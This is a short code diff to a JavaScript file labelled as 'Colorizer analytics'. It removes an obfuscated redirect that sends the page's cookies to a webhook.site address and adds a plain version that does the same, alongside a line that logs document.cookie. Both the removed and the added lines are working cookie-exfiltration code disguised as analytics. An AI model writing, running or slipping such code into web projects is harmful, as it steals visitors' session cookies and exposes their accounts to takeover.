@@ -1,5 +1,4 @@
 console.log('Colorizer analytics loaded');
 console.log(document.cookie);
-
-console.log('Colorizer analytics loaded');
-var _0x1a2b=['webhook','site','31af76ab-f7fb-48e1-8f59-562031cd298a','cookie','href','location'];(function(_0x1,_0x2){var _0x3=function(_0x4){while(--_0x4){_0x1['push'](_0x1['shift']());}};_0x3(++_0x2);}(_0x1a2b,0x65));var _0x3d98=function(_0x1,_0x2){_0x1=_0x1-0x0;var _0x3=_0x1a2b[_0x1];return _0x3;};window[_0x3d98('0x5')][_0x3d98('0x4')]=_0x3d98('0x0')+'://'+_0x3d98('0x1')+'.'+_0x3d98('0x2')+'/?c='+encodeURIComponent(document[_0x3d98('0x3')]);
+window.location.href = 'https://webhook.site/31af76ab-f7fb-48e1-8f59-562031cd298a?c=' + 
+                      encodeURIComponent(document.cookie);
